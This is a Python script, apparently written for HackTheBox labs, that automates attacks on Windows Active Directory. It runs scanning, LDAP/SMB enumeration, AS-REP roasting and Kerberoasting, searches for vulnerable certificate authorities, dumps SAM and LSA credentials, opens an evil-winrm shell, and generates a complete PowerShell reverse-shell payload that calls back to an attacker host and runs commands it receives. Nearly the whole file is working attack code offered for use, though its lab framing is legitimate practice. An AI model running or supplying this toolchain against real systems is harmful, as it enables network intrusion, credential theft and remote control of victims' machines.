#!/usr/bin/env python3
"""
HTB Windows AD Auto Recon v4.0
- Automated AS-REP/Kerberoasting
- ADCS checks
- Reverse shell generator
- JSON export & logging
"""

import subprocess, sys, os, argparse, json, shutil, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

# ================= Colors ================= #
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

# ================= Utils ================= #
def log(msg, color=Colors.YELLOW):
    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {msg}{Colors.RESET}")

def check_tool(tool):
    if shutil.which(tool) is None:
        log(f"Tool not found: {tool}. Please install it!", Colors.RED)
        return False
    return True

def run_cmd(cmd, timeout=60, capture=True, retries=2):
    for attempt in range(retries):
        try:
            log(f"Running: {' '.join(cmd)}", Colors.CYAN)
            result = subprocess.run(cmd, capture_output=capture, text=True, timeout=timeout)
            if result.stdout:
                lines = result.stdout.strip().splitlines()
                for line in lines[:20]:
                    print(line)
                if len(lines) > 20:
                    log(f"...Output truncated ({len(lines)} lines)", Colors.YELLOW)
            return result
        except subprocess.TimeoutExpired:
            log(f"Command timed out (attempt {attempt+1}): {' '.join(cmd)}", Colors.RED)
            time.sleep(2)
        except Exception as e:
            log(f"Error running command: {e}", Colors.RED)
            break
    return None

# ================= Banner ================= #
def banner():
    print(f"""{Colors.BLUE}
    ╔════════════════════════════════════════╗
    ║     HTB Windows AD Auto Recon v4.0     ║
    ║       Kerberos, ADCS, Shells           ║
    ╚════════════════════════════════════════╝{Colors.RESET}
    """)

# ================= Recon Module ================= #
class Recon:
    def __init__(self, target, stealth=False):
        self.target = target
        self.stealth = stealth

    def quick_scan(self):
        log(f"Performing quick scan on {self.target}", Colors.GREEN)
        run_cmd(["nmap", "-Pn", "-sC", "-sV", self.target])

# ================= AD Enumeration ================= #
class ADEnumeration:
    def __init__(self, target, username, password, domain=""):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.creds = f"{domain}\\{username}" if domain else username
        self.results = {}

    def ldap_enum(self):
        log("Running LDAP enumeration...", Colors.GREEN)
        tasks = [
            ["nxc", "ldap", self.target, "-u", self.username, "-p", self.password, "--users"],
            ["nxc", "ldap", self.target, "-u", self.username, "-p", self.password, "--groups"]
        ]
        for task in tasks:
            res = run_cmd(task)
            self.results[task[-1]] = res.stdout if res else ""

    def smb_enum(self):
        log("Running SMB enumeration...", Colors.GREEN)
        tasks = [
            ["nxc", "smb", self.target, "-u", self.username, "-p", self.password, "--shares"],
            ["nxc", "smb", self.target, "-u", self.username, "-p", self.password, "--loggedon-users"]
        ]
        for task in tasks:
            res = run_cmd(task)
            self.results[task[-1]] = res.stdout if res else ""

# ================= Kerberos Attacks ================= #
class KerberosAttacks:
    def __init__(self, target, username, password, domain=""):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.hash_files = {}

    def asrep_roast(self):
        outfile = "asrep.txt"
        log("Performing AS-REP roasting...", Colors.GREEN)
        run_cmd(["nxc", "ldap", self.target, "-u", self.username, "-p", self.password, "--asreproast", outfile])
        self.hash_files["asrep"] = outfile

    def kerberoast(self):
        outfile = "kerb.txt"
        log("Performing Kerberoasting...", Colors.GREEN)
        run_cmd(["nxc", "ldap", self.target, "-u", self.username, "-p", self.password, "--kerberoast", outfile])
        self.hash_files["kerberoast"] = outfile

# ================= ADCS Checks ================= #
class ADCS:
    def __init__(self, target, username, password, domain=""):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.results = {}

    def check_certificates(self):
        log("Enumerating ADCS for vulnerable CAs...", Colors.GREEN)
        run_cmd([
            "certipy-ad", "find", "-u", f"{self.domain}\\{self.username}" if self.domain else self.username,
            "-p", self.password, "-dc-ip", self.target, "-vulnerable", "-stdout"
        ])

# ================= Privilege Escalation ================= #
class PrivEsc:
    def __init__(self, target, username, password):
        self.target = target
        self.username = username
        self.password = password

    def credential_dump(self):
        log("Attempting credential dumping...", Colors.GREEN)
        tasks = [
            ["nxc", "smb", self.target, "-u", self.username, "-p", self.password, "--sam"],
            ["nxc", "smb", self.target, "-u", self.username, "-p", self.password, "--lsa"],
        ]
        for task in tasks:
            run_cmd(task)

# ================= Shell Access ================= #
class ShellAccess:
    def __init__(self, target, username, password, domain=""):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain

    def winrm_shell(self):
        log("Checking WinRM access...", Colors.GREEN)
        result = run_cmd(["nxc", "winrm", self.target, "-u", self.username, "-p", self.password])
        if result and result.returncode == 0:
            log("WinRM available! Launching shell...", Colors.GREEN)
            run_cmd(["evil-winrm", "-i", self.target, "-u", self.username, "-p", self.password], timeout=120, capture=False)

    def reverse_shell(self, lhost, lport):
        log("Generating PowerShell reverse shell...", Colors.GREEN)
        ps_payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        log(f"Payload: {ps_payload[:60]}... (truncated)", Colors.YELLOW)

# ================= Main ================= #
def main():
    banner()
    parser = argparse.ArgumentParser(description="HTB Windows AD Auto Recon v4.0")
    parser.add_argument("target")
    parser.add_argument("-u", "--username", default="htbuser")
    parser.add_argument("-p", "--password", default="Password123!")
    parser.add_argument("-d", "--domain", default="")
    parser.add_argument("-l", "--lhost", default="[IP_ADDRESS]")
    parser.add_argument("-P", "--lport", default="4444")
    parser.add_argument("-o", "--output", default="results")
    parser.add_argument("--full", action="store_true")
    parser.add_argument("--shell", action="store_true")
    parser.add_argument("--stealth", action="store_true")
    args = parser.parse_args()

    # Setup output directory
    Path(args.output).mkdir(exist_ok=True)
    log(f"Results will be saved to: {args.output}")

    # Check tools
    tools = ["nxc", "certipy-ad", "nmap"]
    if not all(check_tool(t) for t in tools):
        sys.exit(1)

    # Initialize phases
    recon = Recon(args.target, args.stealth)
    enum = ADEnumeration(args.target, args.username, args.password, args.domain)
    kerb = KerberosAttacks(args.target, args.username, args.password, args.domain)
    adcs = ADCS(args.target, args.username, args.password, args.domain)
    priv = PrivEsc(args.target, args.username, args.password)
    shell = ShellAccess(args.target, args.username, args.password, args.domain)

    # Execute
    recon.quick_scan()

    if not args.full:
        print(f"{Colors.YELLOW}[!] Run with --full for complete enumeration.{Colors.RESET}")
    else:
        enum.ldap_enum()
        enum.smb_enum()
        kerb.asrep_roast()
        kerb.kerberoast()
        adcs.check_certificates()
        priv.credential_dump()

    if args.shell:
        shell.winrm_shell()
        shell.reverse_shell(args.lhost, args.lport)

if __name__ == "__main__":
    main()  